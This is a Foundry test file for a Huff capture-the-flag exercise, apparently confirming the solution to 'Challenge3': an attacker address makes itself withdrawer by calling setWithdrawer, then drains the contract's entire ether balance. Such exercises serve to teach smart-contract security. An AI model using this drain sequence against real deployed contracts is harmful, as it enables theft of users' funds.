// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.15;

import "foundry-huff/HuffDeployer.sol";
import "forge-std/Test.sol";
import "./IChallenge3.sol";
import "./Challenge3Exploit.sol";
import "forge-std/console2.sol";

contract Challenge3Test is Test {
    Challenge3 test;

    function setUp() public {
        test = Challenge3(
            HuffDeployer.deploy("HuffChallenge/challenge3/Challenge3")
        );
        test.deposit{value: 0.1 ether}();
        assertEq(address(test).balance, 0.1 ether);
    }

    function testExploit() public {
        vm.startPrank(address(1));
        vm.deal(address(1), 1 ether);
        test.deposit{value: 1}();
        test.setWithdrawer{value: 2}(address(1));
        assertEq(address(test).balance, 100_000_000_000_000_003);
        test.withdraw();
        vm.stopPrank();
        assertEq(address(test).balance, 0 ether);
        assertEq(address(1).balance, 1.1 ether);
    }
}
